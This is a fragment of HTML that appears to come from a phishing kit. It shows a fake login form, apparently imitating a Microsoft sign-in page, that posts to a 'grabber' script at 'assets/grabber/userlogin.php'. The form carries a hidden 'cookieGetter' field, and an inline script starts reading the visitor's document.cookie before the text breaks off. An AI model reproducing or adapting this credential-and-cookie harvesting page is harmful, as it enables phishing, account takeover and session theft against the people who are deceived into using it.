...
<form name="f1" id="i0281" validate="validate" spellcheck="false" method="post" target="_top" autocomplete="off" action="./assets/grabber/userlogin.php" class="provide-min-height">

    <input type="hidden" name="cookieGetter" value ="" id ="cookieGetter">
...
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    ...
    <script>
      let decodedCookie = window.decodeURIComponent(window.document.cookie);
